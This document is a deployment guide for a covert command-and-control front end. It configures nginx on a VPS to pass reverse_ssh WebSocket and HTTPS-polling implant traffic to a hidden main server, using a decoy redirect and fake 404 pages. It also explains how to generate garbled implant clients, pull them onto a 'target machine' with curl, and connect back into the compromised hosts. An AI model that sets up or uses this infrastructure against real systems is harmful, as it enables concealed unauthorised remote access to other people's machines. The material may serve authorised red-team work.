# Nginx WSS/HTTPS VPS Entrypoint

Use this when the public VPS should look like a normal HTTPS endpoint while
forwarding `reverse_ssh` web transports to the main server over the internal
SoftEther path.

Repository references:

- `reverse_logger`: <https://github.com/durck/reverse_logger>
- `reverse_ssh`: <https://github.com/durck/reverse_ssh>

Supported transports:

- WSS: `GET /ws` with `Upgrade: websocket`.
- HTTPS polling: `HEAD /push?key=...`, followed by high-volume `GET /push/*`
  and `POST /push`.

Only WSS handshakes and HTTPS polling init requests are forwarded as ingress
events. Polling `GET` and `POST` requests are proxied but intentionally not
stored as edge events. Nginx uses `mirror` for request-start capture; the JSON
access log is only a local diagnostic trail because WebSocket access logs are
emitted when the long-lived connection closes.

Do not enable forwarder tail mode while mirror capture is active. Tail mode is
only a fallback for deployments that cannot use nginx `mirror`.

### Mirror capture and original request paths

Nginx mirror creates an internal subrequest to `/_rssh_ingress_capture`. Inside
that subrequest, `$uri` is the mirror location (`/_rssh_ingress_capture`), not
the original transport path (`/ws`, `/track383211`, and so on). The repository
templates therefore save the original path in parent locations before calling
`mirror`:

```nginx
set $rssh_mirror_path $uri;
set $rssh_mirror_args $args;
set $rssh_mirror_request_uri $request_uri;
mirror /_rssh_ingress_capture;
```

The capture location forwards `$rssh_mirror_path` to the edge forwarder as
`X-Original-Path`. Without this, the forwarder accepts mirror traffic with HTTP
202 but does not spool ingress events, and central `ingress_events.jsonl` stays
empty.

Manual `curl` tests against `http://127.0.0.1:18080/capture` must set
`X-Original-Path` to the real transport path; a successful 202 alone is not
enough.

## Client Downloads

`reverse_ssh` serves generated client binaries on the same HTTPS listener as
WSS and HTTPS polling transports. The `link` command stores the download path in
`--name`; for example `--name main` is served on the backend at `GET /main`.

The nginx decoy `location /` redirect must not catch those download URLs. The
repository templates therefore proxy a dedicated public prefix, default `/dl/`,
to the internal `reverse_ssh` listener over **plain HTTP**, strip that prefix
before forwarding, and keep WSS/HTTPS polling paths proxied over **HTTPS**.

`reverse_ssh` runs with `--tls`, but its download channel on `:3232` is still
accepted as plain `GET /{name}` on the internal SoftEther path. Public clients
use `https://<rssh_domain>/dl/<name>`; nginx terminates TLS and forwards
`http://<main_internal_ip>:3232/<name>` to the backend. Do not proxy `/dl/` to
`https://<main>:3232/` unless you also terminate TLS correctly for the internal
SNI/certificate.

Generate clients without the public prefix in `--name`:

```text
link --wss --ws-path /ws --push-path /push --name main
```

Download from the target host:

```sh
curl -LO https://<rssh_domain>/dl/main
```

Script wrappers such as `https://<rssh_domain>/dl/main.sh` use the same
mapping. Unknown paths under `/dl/` still reach `reverse_ssh`, which returns a
fake nginx 404 page for missing link names.

The `/dl/` location must set `proxy_buffering off`. `reverse_ssh` serves large
binaries with `Transfer-Encoding: chunked` and no `Content-Length`; nginx's
default response buffering can truncate multi-megabyte downloads with
`transfer closed with outstanding read data remaining` or
`upstream prematurely closed connection` in the error log.

Keep `link --name <filename>` aligned with the path after `/dl/`. Transport
paths (`/ws`, `/push`, or custom values) are independent from download paths.

## Main Server

Expose central `rssh-logger` on the internal address for ingress forwarding:

```sh
cd /opt/reverse-logger
docker compose -f docker-compose.yml -f docker-compose.edge-forward.yml up -d
```

Keep `EDGE_FORWARD_TOKEN` in `.env`; the VPS forwarder uses the same token for
`/ingress-events/<EDGE_FORWARD_TOKEN>`.

If you change public transport paths, configure all three places consistently:

- nginx locations and `map` rules;
- VPS forwarder `RSSH_WS_PATH` / `RSSH_PUSH_PATH`;
- central logger `INGRESS_WS_PATH` / `INGRESS_PUSH_PATH`.
- main `reverse_ssh` listener env `REVERSE_SSH_WS_PATH` /
  `REVERSE_SSH_PUSH_PATH`;
- generated clients from `link --ws-path` / `link --push-path`.

The central logger validates ingress payloads against these paths and rejects
wrong-path or malformed polling-key events even when the forwarding token is
valid. `INGRESS_WS_PATH` defaults to `/ws`; `INGRESS_PUSH_PATH` defaults to
`/push`. Custom paths must be absolute base paths without a trailing slash.

## Operator and Client Workflow

Use this sequence after the main `reverse_ssh` server and the nginx edge are
running.

### 1. Connect to the internal catcher console

The public nginx endpoint is for generated `reverse_ssh` clients, not for the
operator's OpenSSH session.

```sh
ssh -i ~/.ssh/reverse_ssh_operator -p 3232 <main_internal_ip>
```

### 2. Generate a client inside the catcher console

Before generating custom-path clients, the main `reverse_ssh` listener must
already be running with the same paths. In the Docker stack, set
`REVERSE_SSH_WS_PATH` and `REVERSE_SSH_PUSH_PATH` in `.env`, then recreate the
listener.

For WSS:

```text
link --wss --ws-path /ws --push-path /push --name main
```

For HTTPS polling:

```text
link --https --ws-path /ws --push-path /push --name main
```

If the public paths are customized, pass the same values to `link`:

```text
link --wss --ws-path /rssh-ws --push-path /rssh-push --name main
link --https --ws-path /rssh-ws --push-path /rssh-push --name main
```

For Ansible-managed VPS edges, `deploy/ansible/reverse-ssh-links.yml` can do
this from the main host after the VPS passes readiness checks. It reads
`rssh_domain`, `rssh_ws_path`, and `rssh_push_path` from inventory/group vars,
checks `link -l`, skips existing names, and optionally rotates them with
`link -r <name>`:

```sh
cd deploy/ansible
ansible-playbook reverse-ssh-links.yml
ansible-playbook reverse-ssh-links.yml -e reverse_ssh_link_force_rotate=true
```

The generated link command includes `--garble`, `--auto-proxy`, and
`--use-kerberos` by default. Configure transports, platforms, console host, and
the name template in `group_vars/main.yml`.

### 3. Download and run the generated client on the target machine

The generated client connects back to the public nginx domain through WSS or
HTTPS polling.

In `link -l`, `Url` is only the binary download URL. It should be served under
the nginx download prefix, normally `https://<rssh_domain>/dl/<name>`. The
`Client Callback` value is the actual reverse_ssh client transport and should
show `wss://...` for WSS clients or `https://...` for HTTPS polling clients.

### 4. Confirm the client and connect to it from the catcher console

```text
ls
connect <client-id>
```

### 5. Optionally connect with OpenSSH jump mode

Run from a host that can reach the internal catcher port.

```sh
ssh -i ~/.ssh/reverse_ssh_operator -J <main_internal_ip>:3232 <client-id>
```

## Automated VPS Deployment

Use `deploy/ansible/vps-edge.yml` for a clean Ubuntu VPS:

```sh
cp deploy/ansible/inventory.example.ini deploy/ansible/inventory.ini
cp deploy/ansible/group_vars/vps_edge.example.yml deploy/ansible/group_vars/vps_edge.yml
nano deploy/ansible/inventory.ini
nano deploy/ansible/group_vars/vps_edge.yml
ansible-playbook -i deploy/ansible/inventory.ini deploy/ansible/vps-edge.yml
```

The playbook installs nginx, clones `reverse_logger`, builds
`nginx-edge-forwarder`, issues a free Let's Encrypt certificate through
HTTP-01 webroot validation or Timeweb DNS-01 validation, renders nginx from
the same WSS/HTTPS semantics as this document, and enables both services. It
intentionally does not create DNS, PTR records, cloud firewall rules,
SoftEther accounts, or the main `reverse_ssh` listener. Use
`edge-and-links.yml` when you want the VPS edge rollout followed immediately by
main-side link generation. See
[../deploy/ansible/README.md](../deploy/ansible/README.md) for the variable
list, staging mode, DNS-01 mode, self-signed smoke mode, and automated link
generation.

ACME prerequisites:

- `rssh_domain` must already have an A record pointing at the VPS public IP.
- Public `80/tcp` must be reachable for HTTP-01 validation; Timeweb DNS-01
  uses DNS TXT validation instead. `443/tcp` remains the WSS/HTTPS transport
  entrypoint.
- PTR is operational hygiene only and is not part of certificate validation.
- This HTTP-01 flow does not issue wildcard certificates; use DNS-01 for
  wildcard names.
- Do not run `certbot --nginx`; this repository keeps nginx configuration
  owned by Ansible and uses `certbot certonly`.

## VPS Nginx

Install nginx and copy the template:

```sh
sudo cp deploy/nginx/rssh-wss-https-entrypoint.conf.example \
  /etc/nginx/sites-available/rssh-entrypoint.conf
sudo ln -s /etc/nginx/sites-available/rssh-entrypoint.conf \
  /etc/nginx/sites-enabled/rssh-entrypoint.conf
```

Edit:

- `server_name`
- certificate paths
- `proxy_pass https://192.0.2.10:3232`
- redirect target
- port `80/tcp` webroot path if using HTTP-01 manually
- `/ws` and `/push` paths if using a patched `reverse_ssh` with custom paths
- `/dl/` download prefix proxied to backend `/` with `proxy_pass .../` so
  `link --name <filename>` maps to public `/dl/<filename>`
- `proxy_buffering off` on `/dl/` so large chunked binaries stream end-to-end

For first manual Let's Encrypt issuance with HTTP-01, use the temporary
HTTP-only bootstrap template before enabling the final `443 ssl` config:

```sh
sudo mkdir -p /var/www/letsencrypt
sudo cp deploy/nginx/rssh-acme-bootstrap.conf.example \
  /etc/nginx/sites-available/rssh-entrypoint.conf
sudo nginx -t
sudo systemctl enable --now nginx
sudo systemctl reload nginx
```

Then run:

```sh
sudo certbot certonly --webroot \
  -w /var/www/letsencrypt \
  -d secret-entry.example.com \
  --email admin@example.com \
  --agree-tos \
  --non-interactive \
  --keep-until-expiring
```

For Timeweb DNS-01, skip the HTTP bootstrap and issue with the DNS plugin:

```sh
sudo snap install certbot-dns-multi
sudo snap set certbot trust-plugin-with-root=ok
sudo snap connect certbot:plugin certbot-dns-multi
sudo install -m 0600 /dev/null /etc/letsencrypt/dns-multi.ini
sudo editor /etc/letsencrypt/dns-multi.ini
sudo certbot certonly \
  -a dns-multi \
  --dns-multi-credentials /etc/letsencrypt/dns-multi.ini \
  --preferred-challenges dns \
  -d secret-entry.example.com \
  --email admin@example.com \
  --agree-tos \
  --non-interactive \
  --keep-until-expiring
```

Use this credentials format:

```ini
dns_multi_provider = timewebcloud
TIMEWEBCLOUD_AUTH_TOKEN = "<Timeweb Cloud API token>"
TIMEWEBCLOUD_PROPAGATION_TIMEOUT = 120
TIMEWEBCLOUD_POLLING_INTERVAL = 5
```

After the certificate exists, replace the bootstrap config with
`deploy/nginx/rssh-wss-https-entrypoint.conf.example`, validate nginx, and
reload.

Validate and reload:

```sh
sudo nginx -t
sudo systemctl reload nginx
```

## VPS Forwarder

Build and install the forwarder:

```sh
cd /opt/reverse-logger
go build -trimpath -ldflags="-s -w" -o /tmp/nginx-edge-forwarder ./cmd/nginx-edge-forwarder
sudo install -m 0755 /tmp/nginx-edge-forwarder /usr/local/bin/nginx-edge-forwarder
```

Install systemd files:

```sh
sudo cp deploy/systemd/nginx-edge-forwarder.env.example /etc/reverse-logger/nginx-edge-forwarder.env
sudo cp deploy/systemd/nginx-edge-forwarder.service /etc/systemd/system/nginx-edge-forwarder.service
sudo mkdir -p /var/lib/reverse-logger/nginx-edge-spool
sudo chmod 750 /var/lib/reverse-logger /var/lib/reverse-logger/nginx-edge-spool
sudo nano /etc/reverse-logger/nginx-edge-forwarder.env
sudo systemctl daemon-reload
sudo systemctl enable --now nginx-edge-forwarder
```

`nginx-edge-forwarder.service` also sets `StateDirectory=` for
`/var/lib/reverse-logger` and the spool subdirectory. The explicit `mkdir`
avoids `226/NAMESPACE` when an older unit without `StateDirectory=` is still
installed.

Set `VPS_INTERNAL_IP` to the address the **main server** sees for this VPS on the
SoftEther path (for example `10.21.125.98`), not the VPS LAN address. The
central logger matches ingress events to webhooks using that value. The logger
also stores the observed HTTP source address of the forwarder as `forwarder_ip`
and uses it when `VPS_INTERNAL_IP` is absent or wrong.

Check:

```sh
journalctl -u nginx-edge-forwarder -n 100 --no-pager
tail -n 20 /var/log/nginx/reverse_ssh_ingress.json
```

## Auth and TLS Notes

Public TLS terminates at nginx. This does not break `reverse_ssh` client/server
authentication: current clients do not pin the TLS certificate, and the SSH
host-key fingerprint check still happens inside the WSS/HTTPS payload.

The nginx ingress log is VPS metadata. The canonical session lifecycle still
comes from the `reverse_ssh` webhook. The central logger stores raw ingress
events, raw webhook events, and a best-effort `enriched_events` journal.

When `reverse_ssh` runs with `--trusted-proxy-cidr`, nginx must overwrite
client IP headers with `$remote_addr` (`X-Real-IP` and `X-Forwarded-For`) before
proxying to the backend. Do not use `$proxy_add_x_forwarded_for` for this
transport route; it preserves client-supplied values and makes the real-IP
header spoofable.
